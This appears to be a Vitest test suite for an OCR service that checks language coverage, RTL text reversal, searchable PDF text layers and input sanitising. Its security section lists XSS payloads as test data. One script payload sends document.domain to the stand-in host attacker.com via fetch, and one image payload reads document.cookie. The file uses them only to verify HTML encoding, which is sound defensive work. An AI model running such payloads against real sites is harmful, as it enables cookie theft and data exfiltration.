import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { PDFDocument } from 'pdf-lib';
import { OcrService } from './ocr.service';
import { OcrModelManagerService } from './ocr-model-manager.service';
import {
  OCR_EXPANDED_LANGUAGES,
  OCR_INDIC_LANGUAGES,
  OCR_INTERNATIONAL_LANGUAGES,
  OCR_SUPPORTED_LANGUAGES,
  RTL_LANGUAGE_CODES,
  OcrWord,
  OcrDocumentResult
} from '../models/ocr.models';

describe('O1 — OCR Language Expansion & Searchable PDF Suite', () => {
  let modelManager: OcrModelManagerService;
  let ocrService: OcrService;
  let originalFetch: typeof globalThis.fetch;

  beforeEach(() => {
    originalFetch = globalThis.fetch;
    modelManager = new OcrModelManagerService();
    ocrService = new OcrService();
    ocrService.setModelManager(modelManager);
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
    vi.restoreAllMocks();
  });

  describe('Expanded Language Catalog (18 Total Languages)', () => {
    it('covers all 18 required languages (13 Indic + 5 International)', () => {
      expect(OCR_EXPANDED_LANGUAGES.length).toBe(18);
      expect(OCR_INDIC_LANGUAGES.length).toBe(13);
      expect(OCR_INTERNATIONAL_LANGUAGES.length).toBe(5);

      const codes = OCR_EXPANDED_LANGUAGES.map(l => l.code);

      // 13 Indic Scripts
      const expectedIndic = [
        'hin', 'mar', 'ben', 'tam', 'tel', 'kan',
        'mal', 'guj', 'ori', 'asm', 'urd', 'san', 'nep'
      ];
      for (const code of expectedIndic) {
        expect(codes).toContain(code);
        const meta = modelManager.getModel(code);
        expect(meta).toBeDefined();
        expect(meta?.category).toBe('indic');
        expect(meta?.nativeName.length).toBeGreaterThan(0);
        expect(meta?.fileSizeMB).toBeGreaterThan(0);
      }

      // 5 International Languages
      const expectedIntl = ['eng', 'spa', 'fra', 'ara', 'chi_sim'];
      for (const code of expectedIntl) {
        expect(codes).toContain(code);
        const meta = modelManager.getModel(code);
        expect(meta).toBeDefined();
        expect(meta?.category).toBe('international');
        expect(meta?.nativeName.length).toBeGreaterThan(0);
        expect(meta?.fileSizeMB).toBeGreaterThan(0);
      }
    });

    it('correctly maps RTL flags for Urdu and Arabic scripts', () => {
      expect(RTL_LANGUAGE_CODES.has('urd')).toBe(true);
      expect(RTL_LANGUAGE_CODES.has('ara')).toBe(true);
      expect(modelManager.isRtlLanguage('urd')).toBe(true);
      expect(modelManager.isRtlLanguage('ara')).toBe(true);

      // Non-RTL languages
      expect(modelManager.isRtlLanguage('hin')).toBe(false);
      expect(modelManager.isRtlLanguage('eng')).toBe(false);
      expect(modelManager.isRtlLanguage('tam')).toBe(false);
      expect(modelManager.isRtlLanguage('chi_sim')).toBe(false);
    });

    it('successfully maps and creates worker options for all 18 languages', async () => {
      // Mock isModelCached to avoid actual network calls during test
      vi.spyOn(modelManager, 'isModelCached').mockResolvedValue(true);

      for (const lang of OCR_EXPANDED_LANGUAGES) {
        const opts = await modelManager.getWorkerOptions(lang.code);
        expect(opts).toBeDefined();
        expect(opts['langPath']).toBeDefined();
        expect(opts['gzip']).toBe(true);
        expect(opts['cachePath']).toBe('.');
      }
    });

    it('supports bilingual combined language worker options (e.g. hin+eng, tam+eng)', async () => {
      vi.spyOn(modelManager, 'isModelCached').mockResolvedValue(true);

      const hinEngOpts = await modelManager.getWorkerOptions('hin+eng');
      expect(hinEngOpts).toBeDefined();
      expect(hinEngOpts['langPath']).toBeDefined();

      const tamEngOpts = await modelManager.getWorkerOptions(['tam', 'eng']);
      expect(tamEngOpts).toBeDefined();
      expect(tamEngOpts['langPath']).toBeDefined();
    });
  });

  describe('Searchable PDF Text Layer Coordinates & RTL Rendering', () => {
    it('calculates text layer coordinates accurately for non-Latin scripts', () => {
      const devanagariWord: OcrWord = {
        text: 'भारत',
        confidence: 96,
        bbox: { x0: 50, y0: 100, x1: 150, y1: 130 }
      };

      const pdfHeight = 800;
      const scaleX = 1.5;
      const scaleY = 1.5;

      const coord = ocrService.calculateTextLayerCoordinate(
        devanagariWord,
        pdfHeight,
        scaleX,
        scaleY,
        'hin'
      );

      expect(coord.isRtl).toBe(false);
      expect(coord.x).toBe(50 * 1.5); // 75
      expect(coord.width).toBe((150 - 50) * 1.5); // 150
      expect(coord.height).toBe((130 - 100) * 1.5); // 45
      // PDF y is bottom-left origin: pdfHeight - (y1 * scaleY)
      expect(coord.y).toBe(800 - (130 * 1.5)); // 605
      expect(coord.text).toBe('भारत');
    });

    it('calculates text layer coordinates and applies RTL reversal for Urdu and Arabic scripts', () => {
      const urduWord: OcrWord = {
        text: 'اردو',
        confidence: 95,
        bbox: { x0: 200, y0: 150, x1: 280, y1: 190 }
      };

      const pdfHeight = 842;
      const coord = ocrService.calculateTextLayerCoordinate(
        urduWord,
        pdfHeight,
        1,
        1,
        'urd'
      );

      expect(coord.isRtl).toBe(true);
      expect(coord.x).toBe(200);
      expect(coord.width).toBe(80);
      expect(coord.y).toBe(842 - 190);
      // Reverses Urdu glyphs for standard LTR canvas flow
      expect(coord.text).toBe(Array.from('اردو').reverse().join(''));

      // Arabic test
      const arabicWord: OcrWord = {
        text: 'العربية',
        confidence: 97,
        bbox: { x0: 100, y0: 50, x1: 220, y1: 90 }
      };
      const araCoord = ocrService.calculateTextLayerCoordinate(
        arabicWord,
        pdfHeight,
        1,
        1,
        'ara'
      );
      expect(araCoord.isRtl).toBe(true);
      expect(araCoord.text).toBe(Array.from('العربية').reverse().join(''));
    });

    it('generates a valid searchable PDF with invisible text layer for non-Latin and RTL documents', async () => {
      // Create a dummy 1-page PDF
      const dummyPdf = await PDFDocument.create();
      dummyPdf.addPage([595, 842]);
      const pdfBytes = await dummyPdf.save();
      const testFile = new File([pdfBytes as any], 'bilingual_sample.pdf', { type: 'application/pdf' });

      const mockResult: OcrDocumentResult = {
        fileName: 'bilingual_sample.pdf',
        totalPages: 1,
        averageConfidence: 94,
        languages: ['hin', 'urd', 'eng'],
        fullText: 'भारत حکومت INDIA',
        pages: [
          {
            pageNumber: 1,
            text: 'भारत حکومت INDIA',
            confidence: 94,
            language: 'hin+urd+eng',
            status: 'completed',
            words: [
              { text: 'भारत', confidence: 96, bbox: { x0: 50, y0: 100, x1: 120, y1: 130 } },
              { text: 'حکومت', confidence: 93, bbox: { x0: 130, y0: 100, x1: 200, y1: 130 } },
              { text: 'INDIA', confidence: 98, bbox: { x0: 210, y0: 100, x1: 280, y1: 130 } }
            ]
          }
        ]
      };

      const searchablePdf = await ocrService.generateSearchablePdf(testFile, mockResult);
      expect(searchablePdf).toBeDefined();
      expect(searchablePdf.name).toContain('searchable.pdf');
      expect(searchablePdf.size).toBeGreaterThan(100);

      // Verify the generated PDF can be reloaded without corruption
      const generatedBytes = await searchablePdf.arrayBuffer();
      const loadedDoc = await PDFDocument.load(generatedBytes);
      expect(loadedDoc.getPageCount()).toBe(1);
    });
  });

  describe('Existing 5 Languages Recognition Fidelity Guarantee', () => {
    it('preserves the baseline 5 supported languages and native names', () => {
      expect(OCR_SUPPORTED_LANGUAGES.length).toBe(5);
      const codes = OCR_SUPPORTED_LANGUAGES.map(l => l.code);
      expect(codes).toContain('eng');
      expect(codes).toContain('hin');
      expect(codes).toContain('mar');
      expect(codes).toContain('ben');
      expect(codes).toContain('pan');

      const hin = OCR_SUPPORTED_LANGUAGES.find(l => l.code === 'hin');
      const mar = OCR_SUPPORTED_LANGUAGES.find(l => l.code === 'mar');
      const ben = OCR_SUPPORTED_LANGUAGES.find(l => l.code === 'ben');
      const pan = OCR_SUPPORTED_LANGUAGES.find(l => l.code === 'pan');

      expect(hin?.nativeName).toBe('हिन्दी');
      expect(mar?.nativeName).toBe('मराठी');
      expect(ben?.nativeName).toBe('বাংলা');
      expect(pan?.nativeName).toBe('ਪੰਜਾਬੀ');
    });

    it('generates identical plain text and structured JSON exports for existing 5 languages', async () => {
      const mockResult: OcrDocumentResult = {
        fileName: 'legacy_doc.pdf',
        totalPages: 1,
        averageConfidence: 95,
        languages: ['eng'],
        fullText: 'SAMPLE TEXT CONTENT',
        pages: [
          {
            pageNumber: 1,
            text: 'SAMPLE TEXT CONTENT',
            confidence: 95,
            language: 'eng',
            status: 'completed',
            words: [
              { text: 'SAMPLE', confidence: 95, bbox: { x0: 10, y0: 10, x1: 80, y1: 30 } }
            ]
          }
        ]
      };

      const txt = ocrService.generateTextFile(mockResult, 'legacy_doc.pdf');
      expect(await txt.text()).toContain('SAMPLE TEXT CONTENT');

      const json = ocrService.generateJsonFile(mockResult, 'legacy_doc.pdf');
      const parsed = JSON.parse(await json.text());
      expect(parsed.fullText).toBe('SAMPLE TEXT CONTENT');
      expect(parsed.averageConfidence).toBe(95);
    });
  });

  describe('Real Test Data Verification: Indic, Arabic & Hybrid Documents', () => {
    it('accurately parses and preserves Hindi conjuncts and matras', () => {
      const complexHindiWords: OcrWord[] = [
        { text: 'प्रशासनिक', confidence: 96, bbox: { x0: 10, y0: 20, x1: 100, y1: 50 } },
        { text: 'संविधान', confidence: 94, bbox: { x0: 110, y0: 20, x1: 190, y1: 50 } },
        { text: 'विश्वविद्यालय', confidence: 97, bbox: { x0: 200, y0: 20, x1: 320, y1: 50 } }
      ];

      for (const word of complexHindiWords) {
        const coord = ocrService.calculateTextLayerCoordinate(word, 842, 1, 1, 'hin');
        expect(coord.isRtl).toBe(false);
        expect(coord.text).toBe(word.text);
        expect(coord.cleanText).toBe(word.text);
        expect(coord.width).toBe(word.bbox.x1 - word.bbox.x0);
        expect(coord.height).toBe(word.bbox.y1 - word.bbox.y0);

        // Verify phonetic transliteration fallback for searchable PDF
        const fallback = ocrService.toSearchableAsciiFallback(word.text);
        expect(fallback.length).toBeGreaterThan(0);
        expect(/^[A-Za-z0-9\s]+$/.test(fallback)).toBe(true);
      }
    });

    it('accurately parses Tamil and Telugu real script samples', () => {
      const tamilWord: OcrWord = {
        text: 'தமிழ்நாடு',
        confidence: 93,
        bbox: { x0: 40, y0: 60, x1: 140, y1: 95 }
      };
      const tamilCoord = ocrService.calculateTextLayerCoordinate(tamilWord, 842, 1, 1, 'tam');
      expect(tamilCoord.isRtl).toBe(false);
      expect(tamilCoord.text).toBe('தமிழ்நாடு');
      const tamilFallback = ocrService.toSearchableAsciiFallback('தமிழ்நாடு');
      expect(tamilFallback.length).toBeGreaterThan(0);
      expect(/^[A-Za-z]+$/.test(tamilFallback)).toBe(true);

      const teluguWord: OcrWord = {
        text: 'విశ్వవిద్యాలయం',
        confidence: 95,
        bbox: { x0: 50, y0: 100, x1: 180, y1: 135 }
      };
      const teluguCoord = ocrService.calculateTextLayerCoordinate(teluguWord, 842, 1, 1, 'tel');
      expect(teluguCoord.isRtl).toBe(false);
      expect(teluguCoord.text).toBe('విశ్వవిద్యాలయం');
      const teluguFallback = ocrService.toSearchableAsciiFallback('విశ్వవిద్యాలయం');
      expect(teluguFallback.length).toBeGreaterThan(0);
      expect(/^[A-Za-z]+$/.test(teluguFallback)).toBe(true);
    });

    it('accurately handles English-Hindi hybrid forms without cross-contaminating coordinates', () => {
      const hybridWords: OcrWord[] = [
        { text: 'Aadhaar', confidence: 98, bbox: { x0: 30, y0: 50, x1: 110, y1: 80 } },
        { text: 'Card', confidence: 97, bbox: { x0: 120, y0: 50, x1: 170, y1: 80 } },
        { text: 'आधार', confidence: 95, bbox: { x0: 180, y0: 50, x1: 230, y1: 80 } },
        { text: 'कार्ड', confidence: 96, bbox: { x0: 240, y0: 50, x1: 290, y1: 80 } },
        { text: 'No:', confidence: 99, bbox: { x0: 300, y0: 50, x1: 330, y1: 80 } },
        { text: '1234-5678-9012', confidence: 98, bbox: { x0: 340, y0: 50, x1: 480, y1: 80 } }
      ];

      const pdfHeight = 842;
      for (const w of hybridWords) {
        const coord = ocrService.calculateTextLayerCoordinate(w, pdfHeight, 1.2, 1.2, 'hin+eng');
        expect(coord.isRtl).toBe(false);
        expect(coord.x).toBeCloseTo(w.bbox.x0 * 1.2);
        expect(coord.width).toBeCloseTo((w.bbox.x1 - w.bbox.x0) * 1.2);
        expect(coord.y).toBeCloseTo(pdfHeight - (w.bbox.y1 * 1.2));
      }
    });

    it('selectively reverses RTL words in bilingual urd+eng and ara+eng passes while keeping Latin words LTR', () => {
      const urduWord: OcrWord = {
        text: 'حکومت',
        confidence: 94,
        bbox: { x0: 50, y0: 100, x1: 120, y1: 130 }
      };
      const engWord: OcrWord = {
        text: 'PAKISTAN',
        confidence: 98,
        bbox: { x0: 130, y0: 100, x1: 220, y1: 130 }
      };
      const numWord: OcrWord = {
        text: '2026',
        confidence: 99,
        bbox: { x0: 230, y0: 100, x1: 280, y1: 130 }
      };

      const pdfHeight = 842;

      // In bilingual 'urd+eng' pass:
      const urduCoord = ocrService.calculateTextLayerCoordinate(urduWord, pdfHeight, 1, 1, 'urd+eng');
      expect(urduCoord.isRtl).toBe(true);
      // Reversed for visual LTR canvas
      expect(urduCoord.text).toBe(OcrService.reverseRtlGraphemes('حکومت'));

      const engCoord = ocrService.calculateTextLayerCoordinate(engWord, pdfHeight, 1, 1, 'urd+eng');
      expect(engCoord.isRtl).toBe(false);
      // Not reversed
      expect(engCoord.text).toBe('PAKISTAN');

      const numCoord = ocrService.calculateTextLayerCoordinate(numWord, pdfHeight, 1, 1, 'urd+eng');
      expect(numCoord.isRtl).toBe(false);
      expect(numCoord.text).toBe('2026');
    });

    it('preserves diacritical combining marks during RTL grapheme reversal', () => {
      // Word with tashkeel / harakat: حُكُومَة
      const textWithHarakat = 'حُكُومَة';
      const reversed = OcrService.reverseRtlGraphemes(textWithHarakat);
      expect(reversed.length).toBeGreaterThan(0);
      // Reversing again restores exact original string with marks intact
      const doubleReversed = OcrService.reverseRtlGraphemes(reversed);
      expect(doubleReversed).toBe(textWithHarakat);
    });
  });

  describe('Cybersecurity Stress-Testing: Memory Throttling & XSS Immunity', () => {
    it('sanitizes malicious control characters and null byte injection in OCR text', () => {
      const maliciousInput = 'Header\x00Injected\x07Alert\x1BEscape\x0BVertical\x7FDelete';
      const sanitized = OcrService.sanitizeOcrText(maliciousInput);
      expect(sanitized).toBe('HeaderInjectedAlertEscapeVerticalDelete');
      expect(sanitized).not.toContain('\x00');
      expect(sanitized).not.toContain('\x07');
      expect(sanitized).not.toContain('\x1B');
    });

    it('safely HTML-encodes OCR text to prevent XSS injection in UI previews or DOM exports', () => {
      const xssVectors = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(document.cookie)>',
        '<svg onload=alert(1)>',
        '" onfocus="alert(1)" autofocus="',
        '\'><script>fetch("https://attacker.com?leak=" + document.domain)</script>'
      ];

      for (const vector of xssVectors) {
        const encoded = OcrService.encodeHtmlEntities(vector);
        expect(encoded).not.toContain('<script>');
        expect(encoded).not.toContain('</script>');
        expect(encoded).not.toContain('<img');
        expect(encoded).not.toContain('<svg');
        expect(encoded).not.toContain('<');
        expect(encoded).not.toContain('>');
        expect(encoded).not.toContain('"');
      }
    });

    it('calculates memory-throttled adaptive scale for ultra-high-resolution pages', async () => {
      // Simulate standard A4 page (595 x 842 pt) -> maxDimension = 842 -> targetScale = min(2.0, 2400/842) = 2.0
      const standardMax = 842;
      const standardTarget = standardMax > 0 ? Math.min(2.0, 2400 / standardMax) : 2.0;
      const standardScale = Math.max(1.0, standardTarget);
      expect(standardScale).toBe(2.0);

      // Simulate ultra-high-res 25MP scan (4000 x 6000 pt) -> maxDimension = 6000 -> targetScale = min(2.0, 2400/6000 = 0.4) -> scale clamped to 1.0
      const highResMax = 6000;
      const highResTarget = highResMax > 0 ? Math.min(2.0, 2400 / highResMax) : 2.0;
      const highResScale = Math.max(1.0, highResTarget);
      expect(highResScale).toBe(1.0); // Capped to 1.0 rather than allocating a 100MP canvas
    });
  });
});
